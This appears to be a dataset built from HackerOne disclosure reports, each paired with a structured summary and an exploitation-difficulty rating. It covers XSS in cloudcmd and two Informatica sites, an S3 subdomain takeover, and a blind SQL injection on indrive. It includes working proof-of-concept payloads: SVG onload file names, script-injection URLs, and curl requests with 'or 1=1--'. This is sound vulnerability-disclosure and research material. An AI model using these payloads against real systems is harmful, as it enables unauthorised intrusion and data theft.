4,433 downloads in the last week
<image_0>
Vulnerability
Steps To Reproduce:
Install the module
Code 16 Bytes
1$ npm i cloudcmd
Run
Code 50 Bytes
1$ ./node_modules/cloudcmd/bin/cloudcmd.js --root .
In the target directory, create a file with name "><svg onload=alert(3);>
Code 38 Bytes
1bash$ touch '"><svg onload=alert(3);>'
In the browser, go to http://127.0.0.1:8080/, the XSS popup will fire.
<image_1>
Supporting Material/References:
macOS High Sierra 10.13.4
node v8.10.0
npm 5.6.0
Chrome Version 65.0.3325.181 (Official Build) (64-bit)
Wrap up
I contacted the maintainer to let them know: N
I opened an issue in the related repository: N
Impact
It allows executing malicious javascript code in the user's browser



================================================================================
Vulnerability Description:
A Stored XSS vulnerability exists in the cloudcmd module, where a malicious filename containing JavaScript code can be executed in the user's browser when the directory listing is viewed.

Steps to Reproduce:
1. Install the module: `npm i cloudcmd`
2. Run the module: `./node_modules/cloudcmd/bin/cloudcmd.js --root .`
3. Create a file with a malicious name: `touch '"><svg onload=alert(3);>'`
4. Access the web interface at http://127.0.0.1:8080/ to trigger the XSS
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of filename handling in a web file manager, without requiring complex interactions or novel logic. The steps to reproduce are simple and do not involve multiple components or subtle interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/39069: [mysupport.informatica.com] - reflected XSS
================================================================================
RAW DESCRIPTION:

mysupport.informatica.com has reflected XSS vulnerability.
I used browser is Firefox 34.0.5
PoC:
https://mysupport.informatica.com/search.jspa?q=zzz%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3B%3C%2Fscript%3E
thanks



================================================================================
Vulnerability Description:
The mysupport.informatica.com website is vulnerable to reflected Cross-Site Scripting (XSS) where malicious scripts can be injected via the search parameter (q) in the URL. The vulnerability allows execution of arbitrary JavaScript code in the context of the victim's session.

Steps to Reproduce:
1. Navigate to the URL: https://mysupport.informatica.com/search.jspa?q=zzz%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3B%3C%2Fscript%3E in Firefox 34.0.5
2. Observe the JavaScript confirmation dialog displaying the document.domain, indicating successful execution of the injected script
Exploitation Difficulty:
This is a straightforward reflected XSS vulnerability that requires no complex interactions or state manipulation. The attack vector is simple URL parameter injection with a basic JavaScript payload, which is a well-known and commonly tested vulnerability pattern.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/42537: [careers.informatica.com] Cross Site Script Vulnerability on informatica
================================================================================
RAW DESCRIPTION:

Information:- Vulnerability resides on the Carriers page of informatica, where search bar of the carrier page failed to sanitized the users query and hence gives the XSS popup.
Vulnerable URL:- https://careers.informatica.com/
Payload:- "><svg/onload=prompt(1);>
Steps to Reproduce the Vulnerability
Open Carriers page of Informatica and search for anything.
On the next page (search Result page) of search result, there is a option of All Location.
Now search on the All Location field with you JavaScript Payload. (For E.g :- "><svg/onload=prompt(1);>)
As it search, you will get the XSS popup on your Screen which shows that page is vulnerable to XSS vulnerability.
Hope you got the issue and fixed it soon.



================================================================================
Vulnerability Description:
The vulnerability is a Cross-Site Scripting (XSS) issue on the Informatica careers page. The search bar on the Carriers page does not properly sanitize user input, allowing JavaScript code to be executed when a malicious payload is entered into the 'All Location' search field.

Steps to Reproduce:
1. Open the Carriers page of Informatica and search for anything.
2. On the search result page, use the 'All Location' field to search with the JavaScript payload: '><svg/onload=prompt(1);>.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS payload in a standard input field without any complex interactions or state manipulations required. The steps to reproduce are simple and do not require deep understanding of the application's logic or state.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/918946: Subdomain takeover due to an unclaimed Amazon S3 bucket on ███
================================================================================
RAW DESCRIPTION:

Summary:
An unclaimed Amazon S3 bucket on █████████ gives an attacker the possibility to gain full control over this subdomain.
Description:
███████ pointed to an S3 bucket that did no longer exists. The bucket points to an Amazon S3 website bucket in the US East region. I claimed this bucket and successfully took over this subdomain.
Note:
I am reporting this issue to DoD since: "████████ ██████" The ████████ is linked to ███, so I believe this belongs here. I discovered this domain initially from the DoD websites list. Please excuse if this is a misconception.
Impact
This is extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the ██████████ domain. This would allow them to post malicious content which would be mistaken for a valid site. They could:
XSS
Phishing
Bypass domain security
Steal sensitive user data, cookies, etc.
Step-by-step Reproduction Instructions
dig ███ results in:
Code 667 Bytes
1; <<>> DiG 9.11.3-1ubuntu1.12-Ubuntu <<>> ███
2;; global options: +cmd
3;; Got answer:
4;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 53839
5;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1
6
7;; OPT PSEUDOSECTION:
8; EDNS: version: 0, flags:; udp: 4096
9;; QUESTION SECTION:
10;███████.    IN  A
11
12;; ANSWER SECTION:
13██████████. 1022 IN CNAME   ████-website-us-east-1.amazonaws.com.
<image_0>
<image_1>
16
17;; Query time: 304 msec
18;; SERVER: 10.68.0.1#53(10.68.0.1)
19;; WHEN: Wed Jul 08 22:01:20 KST 2020
20;; MSG SIZE  rcvd: 154
█████████ points to an Amazon S3 bucket in the S3 US East 1 region. Visiting http://███████ revealed that the bucket did not exist (refer to before.png).
I created an S3 bucket with the name ████████ on my S3 account in the US East 1 region and uploaded an index.html and an XSS POC (xss_poc_998877665544332211.html).
Visiting http://███ shows the successful subdomain takeover. View the page source to see the following comment: <!-- Demonstrated subdomain takeover by chron0x -->
Visiting http://████████/xss_poc_998877665544332211.html you can see the simple XSS payload in action.
Suggested Mitigation/Remediation Actions
Remove the █████ DNS entry and I will remove the bucket from my Amazon account as soon as this issue is resolved. If you want to reclaim the domain instead, please let me know in the comments and I free the bucket before.
Impact
High. An attacker can use the domain for various malicious activities ranging from XSS, over phishing to cookie stealing, etc. All of this while using a trusted domain name (██████).



================================================================================
Vulnerability Description:
An unclaimed Amazon S3 bucket associated with a subdomain allows an attacker to take over the subdomain by creating the bucket and hosting malicious content, leading to potential attacks like XSS, phishing, and data theft.

Steps to Reproduce:
1. Check DNS records for the subdomain using a tool like dig to identify if it points to an Amazon S3 bucket.
2. If the S3 bucket does not exist, create a bucket with the same name in the same region and upload malicious content.
Exploitation Difficulty:
The attack involves identifying a misconfigured DNS record and exploiting a known issue with unclaimed S3 buckets, which is a straightforward process without complex interactions or novel logic.

--------------------------------------------------------------------------------



Blind SQL Injection Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/2051931: Blind SQL injection on id.indrive.com
================================================================================
RAW DESCRIPTION:

Summary:
The server does not perform sanitization on user input, allowing an attacker to inject arbitrary SQL commands into a query.
Steps To Reproduce:
Go to https://promo.indrive.com/10ridestogetprize_ru/random
Click "Сгенерировать". A request to https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone will be made:
████████
3. Repeat this request, but change the path to:
Code 88 Bytes
1/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--
A random entry from the database will be returned:
████
4. Change the path in a query to:
Code 88 Bytes
1/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--
The response from the server will be empty:
███████
Both requests in curl format
Code 600 Bytes
1curl -i -s -k -X $'GET' \
2    -H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \
3    $'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
Code 600 Bytes
1curl -i -s -k -X $'GET' \
2    -H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \
3    $'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'
Impact
This vulnerability allows attackers to inject any SQL statements into a query.
For example, I was able to retrieve the SQL version:
PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1)



================================================================================
Vulnerability Description:
The server does not sanitize user input, allowing SQL injection. Attackers can inject arbitrary SQL commands, demonstrated by retrieving database entries and confirming with conditional logic (1=1 vs 1=2).

Steps to Reproduce:
1. Go to https://promo.indrive.com/10ridestogetprize_ru/random
2. Click "Сгенерировать" and observe the request to https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone
3. Repeat the request, modifying the path to inject SQL: /api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--
4. Observe the response containing a random database entry
5. Modify the path to /api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--
6. Observe the empty response confirming SQL injection vulnerability
Exploitation Difficulty:
The vulnerability is straightforward to discover using basic SQL injection techniques. The attack involves simple parameter manipulation without complex interactions or state manipulation.

--------------------------------------------------------------------------------



